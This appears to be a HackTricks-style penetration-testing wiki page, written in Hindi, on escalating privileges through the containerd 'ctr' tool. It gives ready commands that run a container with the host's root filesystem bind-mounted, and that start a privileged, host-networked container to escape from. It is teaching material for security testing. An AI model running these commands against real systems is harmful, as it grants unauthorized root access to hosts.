# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## मूल जानकारी

यह जानने के लिए निम्नलिखित link पर जाएँ कि **container stack में `containerd` और `ctr` कहाँ स्थित होते हैं**:


{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

यदि आपको पता चलता है कि किसी host में `ctr` command मौजूद है:
```bash
which ctr
/usr/bin/ctr
```
आप images की सूची बना सकते हैं:
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
और फिर **host के root folder को उसमें mount करके उन images में से एक को run करें**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

एक container को privileged रूप में चलाएँ और उससे escape करें।\
आप privileged container इस प्रकार चला सकते हैं:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
फिर आप **privileged capabilities का दुरुपयोग करके इससे escape करने** के लिए निम्नलिखित page में बताई गई कुछ techniques का उपयोग कर सकते हैं:


{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
